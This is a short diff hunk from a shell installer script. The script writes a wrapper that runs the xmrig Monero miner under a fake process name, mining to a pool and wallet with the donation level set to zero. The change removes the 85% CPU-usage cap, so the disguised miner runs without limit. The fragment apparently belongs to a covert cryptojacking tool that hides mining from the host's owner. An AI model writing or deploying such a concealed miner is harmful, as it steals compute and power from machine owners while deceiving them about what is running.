@@ -47,7 +47,7 @@ tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
 #!/bin/bash
 exec -a $FAKE_NAME "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls \\
   --cpu-priority=$PRIORITY --threads=$CPU_THREADS --donate-level=0 \\
-  --max-cpu-usage=85 --log-file=$LOG_FILE
+  --log-file=$LOG_FILE
 EOF
 
 chmod +x "$INSTALL_DIR/$FAKE_NAME"
